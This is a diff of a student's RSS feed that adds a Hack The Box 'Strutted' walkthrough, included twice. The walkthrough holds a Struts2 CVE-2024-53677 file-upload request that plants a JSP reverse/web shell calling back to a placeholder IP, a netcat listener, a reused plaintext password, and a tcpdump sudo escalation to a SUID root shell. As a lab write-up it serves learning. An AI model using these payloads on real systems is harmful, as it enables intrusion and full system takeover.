@@ -1,5 +1,234 @@
-<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[MyCrib]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>site-lib/media/favicon.png</url><title>MyCrib</title><link/></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Sun, 01 Jun 2025 19:22:46 GMT</lastBuildDate><atom:link href="site-lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Sun, 01 Jun 2025 19:22:44 GMT</pubDate><ttl>60</ttl><dc:creator/><item><title><![CDATA[Home_page]]></title><description><![CDATA[Yoo, wasup??I'm Alex, a 17 years old student getting into cybersec. I was bored this summer and decided to make a site.For you, yes you, who is taking a look right now, I know what you're doing here, decided to check the gen Z mode with some hope.
-Well look no further ma guy/girl.I know. Checking all this yapping of documentation and walkthroughs doesn't pair well with the 2 secs of attention span. That's why I'm here.If you made it this far congrats! I, my self was starting to get bored. Feel free to check my gen Z walkthroughs but don't expect any technical details, these will be hosted on my normal site, BUT these walkthroughs will make it a🌷lovely🌷happy🌷journey🌷 for you and your low attention span. No diss!-etcdrfAbout_me]]></description><link>home_page.html</link><guid isPermaLink="false">Home_page.canvas</guid><pubDate>Sun, 01 Jun 2025 19:22:36 GMT</pubDate></item><item><title><![CDATA[About_me]]></title><description><![CDATA[Yoo, wasup??I'm Alex, a 17 years old student getting into cybersec. I was bored this summer and decided to make a site.For you, yes you, who is taking a look right now, I know what you're doing here, decided to check the gen Z mode with some hope.
-Well look no further ma guy/girl.I know. Checking all this yapping of documentation and walkthroughs doesn't pair well with the 2 secs of attention span. That's why I'm here.If you made it this far congrats! I, my self was starting to get bored. Feel free to check my gen Z walkthroughs but don't expect any technical details, these will be hosted on my normal site, BUT these walkthroughs will make it a🌷lovely🌷happy🌷journey🌷 for you and your low attention span. No diss!-etcdrf]]></description><link>about_me.html</link><guid isPermaLink="false">About_me.md</guid><pubDate>Sat, 31 May 2025 18:43:32 GMT</pubDate></item><item><title><![CDATA[index]]></title><description><![CDATA[Yoo, wasup??I'm Alex, a 17 years old student getting into cybersec. I was bored this summer and decided to make a site.For you, yes you, who is taking a look right now, I know what you're doing here, decided to check the gen Z mode with some hope.
-Well look no further ma guy/girl.I know. Checking all this yapping of documentation and walkthroughs doesn't pair well with the 2 secs of attention span. That's why I'm here.If you made it this far congrats! I, my self was starting to get bored. Feel free to check my gen Z walkthroughs but don't expect any technical details, these will be hosted on my normal site, BUT these walkthroughs will make it a🌷lovely🌷happy🌷journey🌷 for you and your low attention span. No diss!-etcdrfAbout me]]></description><link>index.html</link><guid isPermaLink="false">index.canvas</guid><pubDate>Sun, 01 Jun 2025 11:47:32 GMT</pubDate></item><item><title><![CDATA[About me]]></title><description><![CDATA[Yoo, wasup??I'm Alex, a 17 years old student getting into cybersec. I was bored this summer and decided to make a site.For you, yes you, who is taking a look right now, I know what you're doing here, decided to check the gen Z mode with some hope.
-Well look no further ma guy/girl.I know. Checking all this yapping of documentation and walkthroughs doesn't pair well with the 2 secs of attention span. That's why I'm here.If you made it this far congrats! I, my self was starting to get bored. Feel free to check my gen Z walkthroughs but don't expect any technical details, these will be hosted on my normal site, BUT these walkthroughs will make it a🌷lovely🌷happy🌷journey🌷 for you and your low attention span. No diss!-etcdrf]]></description><link>about-me.html</link><guid isPermaLink="false">About me.md</guid><pubDate>Sat, 31 May 2025 18:43:32 GMT</pubDate></item></channel></rss>
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[MyCrib]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>site-lib/media/favicon.png</url><title>MyCrib</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Tue, 03 Jun 2025 12:34:20 GMT</lastBuildDate><atom:link href="site-lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Tue, 03 Jun 2025 12:34:17 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[Home_page]]></title><description><![CDATA[Latest boxYoo wasupp,
+I'm Alex, a 17 years old student getting into cybersec. I was bored this summer and decided to make a site.For you, yes you, who is taking a look right now, I know what you're doing here, decided to check the gen Z mode with some hope. Well look no further ma guy.I know. Checking all this yapping of documentation and walkthroughs doesn't pair well with the 2 secs of attention span. That's why I'm here.If you made it this far congrats! I, my self was starting to get bored. Feel free to check my gen Z walkthroughs but don't expect any technical details, these will be hosted on my normal site, BUT these walkthroughs will make it a🌷lovely🌷happy🌷journey🌷 for you and your low attention span. No diss!-etcdrfWho am I?]]></description><link>home_page.html</link><guid isPermaLink="false">Home_page.canvas</guid><pubDate>Tue, 03 Jun 2025 12:16:00 GMT</pubDate></item><item><title><![CDATA[Strutted]]></title><description><![CDATA[
+Basic source code analysis
+Linux enumeration Exploiting CVEs
+Apache Struts OGNL injection
+# nmap -A -sV -sC 10.10.11.59 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 23:04 EEST
+Nmap scan report for 10.10.11.59
+Host is up (0.14s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open http nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://strutted.htb/
+Device type: general purpose|router
+Running: Linux 5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1723/tcp)
+HOP RTT ADDRESS
+1 183.32 ms 10.10.16.1
+2 122.21 ms 10.10.11.59
+The nmap scan reveals 2 open ports. We'll go ahead with port 80, adding http://strutted.htb/ to our hosts.# echo "10.10.11.59 strutted.htb" |sudo tee -a /etc/hosts
+10.10.11.59 strutted.htb
+Opening the site we see this...
+<img alt="index.png" src="files/photos/strutted/index.png" target="_self">
+If we click the Download button at the top right corner we can get the Docker environment of the application.
+We don't care about any files except strutted/pom.xml which contains this interesting line... (last one)&lt;---SNIP---&gt;
+&lt;properties&gt;
+&lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;
+&lt;maven.compiler.source&gt;17&lt;/maven.compiler.source&gt;
+&lt;maven.compiler.target&gt;17&lt;/maven.compiler.target&gt;
+&lt;struts2.version&gt;6.3.0.1&lt;/struts2.version&gt;
+&lt;---SNIP---&gt;
+<br>The application uses Struts2 6.3.0.1, with a simple google search we can discover <a data-tooltip-position="top" aria-label="https://nvd.nist.gov/vuln/detail/CVE-2024-53677" rel="noopener nofollow" class="external-link is-unresolved" href="https://nvd.nist.gov/vuln/detail/CVE-2024-53677" target="_self">this CVE</a>
+An attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution.
+<br>Looking a bit further we find <a data-tooltip-position="top" aria-label="https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/" rel="noopener nofollow" class="external-link is-unresolved" href="https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/" target="_self">this link</a> and thanks to Y4tacker and google translate we see that Y4tacker has created a valid OGNL expression, top.UploadFilename = "malicious_script.txt" which allows the modification of filenames.
+For more interesting information about the exploit check the main site!
+Therefore, our payload will look something like this...POST /upload.action HTTP/1.1
+Host: strutted.htb -----------------------------96143769840609966032509216104
+Content-Disposition: form-data; name="Upload"; filename="test.jpeg"
+Content-Type: image/jpeg ÿØÿàJFIFÿÛ	) %!1!%)+../383,7(-.+ &lt;---SNIP---&gt;
+-----------------------------96143769840609966032509216104
+Content-Disposition: form-data; name="top.UploadFileName" ../../shell.jsp
+-----------------------------96143769840609966032509216104-- Things to keep in mind in case you are following blindfolded:
+The -----------------------------96143769840609966032509216104 is a specific boundary automatically generated, please don't copy mine.
+All this junk after ÿØÿà is the binary of the picture, don't copy it either.
+CHANGE name="upload"; TO name="Upload";. CAPITALIZE THE U AT UPLOAD I spent a lot more time than I want to admit trying to realize that.
+The application performs a MIME File type check to verify that the file uploaded is actually an image, which is easily bypassed by leaving the first lines untouched and pasting a web shell right after them.<br>We will use <a data-tooltip-position="top" aria-label="https://github.com/LaiKash/JSP-Reverse-and-Web-Shell/blob/main/shell.jsp" rel="noopener nofollow" class="external-link is-unresolved" href="https://github.com/LaiKash/JSP-Reverse-and-Web-Shell/blob/main/shell.jsp" target="_self">this</a> shell from LaiKash which launches a rev shell and a webshell in a single execution!Therefore, using burpsuite we can intercept the package and paste our shell right after the whole image (you know, all this binary, which btw can be deleted, just remember to keep the first lines!) and change the IP at the final lines.Your package should have this format...POST /upload.action HTTP/1.1
+Host: strutted.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------96143769840609966032509216104
+Content-Length: 4016
+Origin: http://strutted.htb
+Connection: keep-alive
+Referer: http://strutted.htb/
+Cookie: JSESSIONID=9348E35B80227E00B3BFB8198433214A
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i -----------------------------96143769840609966032509216104
+Content-Disposition: form-data; name="Upload"; filename="test.jpeg"
+Content-Type: image/jpeg ÿØÿàJFIFÿÛ	) %!1!%)+../383,7(-.+ &lt;% /* * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (attacker machine), with the IP and Port specified at the end of the file. * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML. * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing * the command specified in the HTML form). This is to avoid to keep it simple. */
+%&gt; &lt;%@page import="java.lang.*"%&gt;
+&lt;%@page import="java.io.*"%&gt;
+&lt;%@page import="java.net.*"%&gt;
+&lt;%@page import="java.util.*"%&gt; &lt;---SHELL-SNIP---&gt; try { Socket socket = new Socket( "YOUR_IP", 9001 ); // Replace with wanted ip and port Process process = Runtime.getRuntime().exec( shellPath ); new StreamConnector(process.getInputStream(), socket.getOutputStream()).start(); new StreamConnector(socket.getInputStream(), process.getOutputStream()).start(); out.println("port opened on " + socket); } catch( Exception e ) {} %&gt;
+&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+-----------------------------96143769840609966032509216104
+Content-Disposition: form-data; name="top.UploadFileName" ../../shell.jsp
+-----------------------------96143769840609966032509216104-- Before forwarding it launch a nc listener! # nc -lvnp 9001AND FORWARD IT!Looking at the response we can see that our webshell has been uploaded successfully!!<br><img alt="response.png" src="files/photos/strutted/response.png" target="_self">Now all it takes is to pass a visit at http://strutted.htb/shell.jsp and we have a shell!Taking a deeper look in the conf dir we find the tomcat-users.xml file which contains a password that should have been changed.tomcat@strutted:~/conf$ cat tomcat-users.xml
+cat tomcat-users.xml &lt;---SNIP---&gt; &lt;user username="admin" password="&lt;must-be-changed&gt;" roles="manager-gui"/&gt; &lt;user username="robot" password="&lt;must-be-changed&gt;" roles="manager-script"/&gt; &lt;role rolename="manager-gui"/&gt; &lt;role rolename="admin-gui"/&gt; &lt;user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/&gt;
+&lt;---SNIP---&gt; &lt;/tomcat-users&gt; Now we should find which user is the admin by checking the passwd file.tomcat@strutted:~/conf$ cat /etc/passwd
+cat /etc/passwd
+&lt;---SNIP---&gt;
+james:x:1000:1000:Network Administrator:/home/james:/bin/bash
+_laurel:x:997:997::/var/log/laurel:/bin/false
+Well james looks like an Administrator, let's try SSH-ing as James with password IT14d6SSP81k.$ ssh james@strutted.htb The authenticity of host 'strutted.htb (10.10.11.59)' can't be established.
+ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'strutted.htb' (ED25519) to the list of known hosts.
+james@strutted.htb's password: &lt;---SNIP---&gt;
+james@strutted:~$
+It worked! Go ahead and grab the flag!james@strutted:~$ cat user.txt a3d7adaa************************
+Checking what james can run with sudo perms we notice that he can use tcpdump with admin permissions.james@strutted:~$ sudo -l
+Matching Defaults entries for james on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty User james may run the following commands on localhost: (ALL) NOPASSWD: /usr/sbin/tcpdump
+<br>Taking a look at <a data-tooltip-position="top" aria-label="https://gtfobins.github.io/gtfobins/tcpdump/" rel="noopener nofollow" class="external-link is-unresolved" href="https://gtfobins.github.io/gtfobins/tcpdump/" target="_self">GTFObins</a> regarding tcpdump we can see that it is possible to elevate privileges using tcpdump
+Sudo
+If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+COMMAND='cp /bin/bash /home/james/root &amp;&amp; chmod +s /home/james/root'
+TF=$(mktemp)
+echo "$COMMAND" &gt; $TF
+chmod +x $TF
+sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+We will modify the command a bit in order to copy /bin/bash as root and bring it to our home directory.james@strutted:~$ COMMAND='cp /bin/bash /home/james/root &amp;&amp; chmod +s /home/james/root'
+james@strutted:~$ TF=$(mktemp)
+james@strutted:~$ echo "$COMMAND" &gt; $TF
+james@strutted:~$ chmod +x $TF
+james@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+Maximum file limit reached: 1
+1 packet captured
+4 packets received by filter
+0 packets dropped by kernel
+james@strutted:~$ ls
+root user.txt
+james@strutted:~$ ./root -p
+root-5.1$
+Now all it remains it to grab the root flag!root-5.1# cat /root/root.txt
+ef50c9a************************
+]]></description><link>machines/2.-medium/strutted.html</link><guid isPermaLink="false">Machines/2. Medium/Strutted.md</guid><dc:creator><![CDATA[etcdrf]]></dc:creator><pubDate>Tue, 03 Jun 2025 00:00:00 GMT</pubDate><enclosure url="files/photos/strutted/index.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;files/photos/strutted/index.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[response]]></title><description><![CDATA[<img src="files/photos/strutted/response.png" target="_self">]]></description><link>files/photos/strutted/response.html</link><guid isPermaLink="false">FIles/photos/Strutted/response.png</guid><pubDate>Tue, 03 Jun 2025 10:10:38 GMT</pubDate><enclosure url="files/photos/strutted/response.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;files/photos/strutted/response.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Apologies.txt]]></title><description><![CDATA[I'm not smart enough to pwn Hard and Insane machines, even with 10 walkthroughs.For now you can check out other pages like the <a data-href="Latest box" href="files/main-page/latest-box.html#_0" class="internal-link" target="_self" rel="noopener nofollow">Latest box</a> or my personal favorite, <a data-href="faculty" href=".html" class="internal-link" target="_self" rel="noopener nofollow">faculty</a>.Stay tuned for when I get smarter!]]></description><link>machines/3.-hard-insane/apologies.txt.html</link><guid isPermaLink="false">Machines/3. Hard - Insane/Apologies.txt.md</guid><pubDate>Sun, 01 Jun 2025 21:03:00 GMT</pubDate></item><item><title><![CDATA[Latest box]]></title><description><![CDATA[Strutted
+Basic source code analysis
+Linux enumeration Exploiting CVEs
+Apache Struts OGNL injection
+# nmap -A -sV -sC 10.10.11.59 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 23:04 EEST
+Nmap scan report for 10.10.11.59
+Host is up (0.14s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open http nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://strutted.htb/
+Device type: general purpose|router
+Running: Linux 5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1723/tcp)
+HOP RTT ADDRESS
+1 183.32 ms 10.10.16.1
+2 122.21 ms 10.10.11.59
+The nmap scan reveals 2 open ports. We'll go ahead with port 80, adding http://strutted.htb/ to our hosts.# echo "10.10.11.59 strutted.htb" |sudo tee -a /etc/hosts
+10.10.11.59 strutted.htb
+Opening the site we see this...
+<img alt="index.png" src="files/photos/strutted/index.png" target="_self">
+If we click the Download button at the top right corner we can get the Docker environment of the application.
+We don't care about any files except strutted/pom.xml which contains this interesting line... (last one)&lt;---SNIP---&gt;
+&lt;properties&gt;
+&lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;
+&lt;maven.compiler.source&gt;17&lt;/maven.compiler.source&gt;
+&lt;maven.compiler.target&gt;17&lt;/maven.compiler.target&gt;
+&lt;struts2.version&gt;6.3.0.1&lt;/struts2.version&gt;
+&lt;---SNIP---&gt;
+<br>The application uses Struts2 6.3.0.1, with a simple google search we can discover <a data-tooltip-position="top" aria-label="https://nvd.nist.gov/vuln/detail/CVE-2024-53677" rel="noopener nofollow" class="external-link is-unresolved" href="https://nvd.nist.gov/vuln/detail/CVE-2024-53677" target="_self">this CVE</a>
+An attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution.
+<br>Looking a bit further we find <a data-tooltip-position="top" aria-label="https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/" rel="noopener nofollow" class="external-link is-unresolved" href="https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/" target="_self">this link</a> and thanks to Y4tacker and google translate we see that Y4tacker has created a valid OGNL expression, top.UploadFilename = "malicious_script.txt" which allows the modification of filenames.
+For more interesting information about the exploit check the main site!
+Therefore, our payload will look something like this...POST /upload.action HTTP/1.1
+Host: strutted.htb -----------------------------96143769840609966032509216104
+Content-Disposition: form-data; name="Upload"; filename="test.jpeg"
+Content-Type: image/jpeg ÿØÿàJFIFÿÛ	) %!1!%)+../383,7(-.+ &lt;---SNIP---&gt;
+-----------------------------96143769840609966032509216104
+Content-Disposition: form-data; name="top.UploadFileName" ../../shell.jsp
+-----------------------------96143769840609966032509216104-- Things to keep in mind in case you are following blindfolded:
+The -----------------------------96143769840609966032509216104 is a specific boundary automatically generated, please don't copy mine.
+All this junk after ÿØÿà is the binary of the picture, don't copy it either.
+CHANGE name="upload"; TO name="Upload";. CAPITALIZE THE U AT UPLOAD I spent a lot more time than I want to admit trying to realize that.
+The application performs a MIME File type check to verify that the file uploaded is actually an image, which is easily bypassed by leaving the first lines untouched and pasting a web shell right after them.<br>We will use <a data-tooltip-position="top" aria-label="https://github.com/LaiKash/JSP-Reverse-and-Web-Shell/blob/main/shell.jsp" rel="noopener nofollow" class="external-link is-unresolved" href="https://github.com/LaiKash/JSP-Reverse-and-Web-Shell/blob/main/shell.jsp" target="_self">this</a> shell from LaiKash which launches a rev shell and a webshell in a single execution!Therefore, using burpsuite we can intercept the package and paste our shell right after the whole image (you know, all this binary, which btw can be deleted, just remember to keep the first lines!) and change the IP at the final lines.Your package should have this format...POST /upload.action HTTP/1.1
+Host: strutted.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------96143769840609966032509216104
+Content-Length: 4016
+Origin: http://strutted.htb
+Connection: keep-alive
+Referer: http://strutted.htb/
+Cookie: JSESSIONID=9348E35B80227E00B3BFB8198433214A
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i -----------------------------96143769840609966032509216104
+Content-Disposition: form-data; name="Upload"; filename="test.jpeg"
+Content-Type: image/jpeg ÿØÿàJFIFÿÛ	) %!1!%)+../383,7(-.+ &lt;% /* * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (attacker machine), with the IP and Port specified at the end of the file. * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML. * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing * the command specified in the HTML form). This is to avoid to keep it simple. */
+%&gt; &lt;%@page import="java.lang.*"%&gt;
+&lt;%@page import="java.io.*"%&gt;
+&lt;%@page import="java.net.*"%&gt;
+&lt;%@page import="java.util.*"%&gt; &lt;---SHELL-SNIP---&gt; try { Socket socket = new Socket( "YOUR_IP", 9001 ); // Replace with wanted ip and port Process process = Runtime.getRuntime().exec( shellPath ); new StreamConnector(process.getInputStream(), socket.getOutputStream()).start(); new StreamConnector(socket.getInputStream(), process.getOutputStream()).start(); out.println("port opened on " + socket); } catch( Exception e ) {} %&gt;
+&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+-----------------------------96143769840609966032509216104
+Content-Disposition: form-data; name="top.UploadFileName" ../../shell.jsp
+-----------------------------96143769840609966032509216104-- Before forwarding it launch a nc listener! # nc -lvnp 9001AND FORWARD IT!Looking at the response we can see that our webshell has been uploaded successfully!!<br><img alt="response.png" src="files/photos/strutted/response.png" target="_self">Now all it takes is to pass a visit at http://strutted.htb/shell.jsp and we have a shell!Taking a deeper look in the conf dir we find the tomcat-users.xml file which contains a password that should have been changed.tomcat@strutted:~/conf$ cat tomcat-users.xml
+cat tomcat-users.xml &lt;---SNIP---&gt; &lt;user username="admin" password="&lt;must-be-changed&gt;" roles="manager-gui"/&gt; &lt;user username="robot" password="&lt;must-be-changed&gt;" roles="manager-script"/&gt; &lt;role rolename="manager-gui"/&gt; &lt;role rolename="admin-gui"/&gt; &lt;user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/&gt;
+&lt;---SNIP---&gt; &lt;/tomcat-users&gt; Now we should find which user is the admin by checking the passwd file.tomcat@strutted:~/conf$ cat /etc/passwd
+cat /etc/passwd
+&lt;---SNIP---&gt;
+james:x:1000:1000:Network Administrator:/home/james:/bin/bash
+_laurel:x:997:997::/var/log/laurel:/bin/false
+Well james looks like an Administrator, let's try SSH-ing as James with password IT14d6SSP81k.$ ssh james@strutted.htb The authenticity of host 'strutted.htb (10.10.11.59)' can't be established.
+ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'strutted.htb' (ED25519) to the list of known hosts.
+james@strutted.htb's password: &lt;---SNIP---&gt;
+james@strutted:~$
+It worked! Go ahead and grab the flag!james@strutted:~$ cat user.txt a3d7adaa************************
+Checking what james can run with sudo perms we notice that he can use tcpdump with admin permissions.james@strutted:~$ sudo -l
+Matching Defaults entries for james on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty User james may run the following commands on localhost: (ALL) NOPASSWD: /usr/sbin/tcpdump
+<br>Taking a look at <a data-tooltip-position="top" aria-label="https://gtfobins.github.io/gtfobins/tcpdump/" rel="noopener nofollow" class="external-link is-unresolved" href="https://gtfobins.github.io/gtfobins/tcpdump/" target="_self">GTFObins</a> regarding tcpdump we can see that it is possible to elevate privileges using tcpdump
+Sudo
+If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+COMMAND='cp /bin/bash /home/james/root &amp;&amp; chmod +s /home/james/root'
+TF=$(mktemp)
+echo "$COMMAND" &gt; $TF
+chmod +x $TF
+sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+We will modify the command a bit in order to copy /bin/bash as root and bring it to our home directory.james@strutted:~$ COMMAND='cp /bin/bash /home/james/root &amp;&amp; chmod +s /home/james/root'
+james@strutted:~$ TF=$(mktemp)
+james@strutted:~$ echo "$COMMAND" &gt; $TF
+james@strutted:~$ chmod +x $TF
+james@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+Maximum file limit reached: 1
+1 packet captured
+4 packets received by filter
+0 packets dropped by kernel
+james@strutted:~$ ls
+root user.txt
+james@strutted:~$ ./root -p
+root-5.1$
+Now all it remains it to grab the root flag!root-5.1# cat /root/root.txt
+ef50c9a************************
+]]></description><link>files/main-page/latest-box.html</link><guid isPermaLink="false">FIles/main page/Latest box.md</guid><pubDate>Sun, 01 Jun 2025 20:32:08 GMT</pubDate><enclosure url="files/photos/strutted/index.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;files/photos/strutted/index.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[index]]></title><description><![CDATA[<img src="files/photos/strutted/index.png" target="_self">]]></description><link>files/photos/strutted/index.html</link><guid isPermaLink="false">FIles/photos/Strutted/index.png</guid><pubDate>Sun, 01 Jun 2025 20:14:25 GMT</pubDate><enclosure url="files/photos/strutted/index.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;files/photos/strutted/index.png&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>
